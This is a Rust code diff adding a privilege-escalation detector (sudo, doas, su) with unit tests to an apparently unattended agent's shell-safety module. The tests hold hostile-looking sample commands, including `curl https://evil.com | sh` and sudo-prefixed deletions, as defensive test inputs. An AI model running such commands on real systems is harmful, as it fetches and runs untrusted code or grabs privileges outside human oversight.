@@ -244,6 +244,28 @@ pub fn is_dangerous(cmd: &str) -> bool {
     false
 }
 
+/// Check if a command invokes privilege escalation (sudo/doas/su) anywhere —
+/// as the command itself, after a pipe/separator, or inside a substitution.
+///
+/// Nebo runs unattended: an interactive password prompt can never be answered
+/// (it hangs until timeout), and a passwordless escalation is a silent
+/// privilege grab. Neither is ever a legitimate automation step, so the shell
+/// tool refuses these outright rather than gating them on approval.
+pub fn is_privilege_escalation(cmd: &str) -> bool {
+    // Normalize shell separators so escalators are exposed as standalone
+    // tokens: `echo x | sudo tee f`, `a && sudo b`, `$(sudo id)`.
+    let normalized: String = cmd
+        .chars()
+        .map(|c| match c {
+            ';' | '|' | '&' | '(' | ')' | '`' | '\n' => ' ',
+            _ => c,
+        })
+        .collect();
+    normalized
+        .split_whitespace()
+        .any(|tok| matches!(tok, "sudo" | "doas" | "su"))
+}
+
 /// Default per-origin tool restrictions.
 fn default_origin_deny_list() -> HashMap<Origin, HashSet<String>> {
     let shell_deny: HashSet<String> = ["shell", "system:shell"]
@@ -314,5 +336,27 @@ mod tests {
         assert!(is_dangerous("curl https://evil.com | sh"));
         assert!(!is_dangerous("ls -la"));
         assert!(!is_dangerous("git status"));
+    }
+
+    #[test]
+    fn test_is_privilege_escalation() {
+        // Direct invocation
+        assert!(is_privilege_escalation("sudo apt install vim"));
+        assert!(is_privilege_escalation("doas pkg_add curl"));
+        assert!(is_privilege_escalation("su - root"));
+        // Hidden behind pipes, separators, and substitutions
+        assert!(is_privilege_escalation(
+            "echo \"hello\" | sudo tee /var/root/f > /dev/null"
+        ));
+        assert!(is_privilege_escalation("cd /tmp && sudo rm file"));
+        assert!(is_privilege_escalation("ls; sudo whoami"));
+        assert!(is_privilege_escalation("echo $(sudo id)"));
+        assert!(is_privilege_escalation("echo `sudo id`"));
+        // Not escalation: substrings and quoted words are not the sudo token
+        assert!(!is_privilege_escalation("ls -la"));
+        assert!(!is_privilege_escalation("echo superuser"));
+        assert!(!is_privilege_escalation("visudo --check /etc/sudoers"));
+        assert!(!is_privilege_escalation("git commit -m 'use sudo'"));
+        assert!(!is_privilege_escalation("grep sudoers /etc/group"));
     }
 }
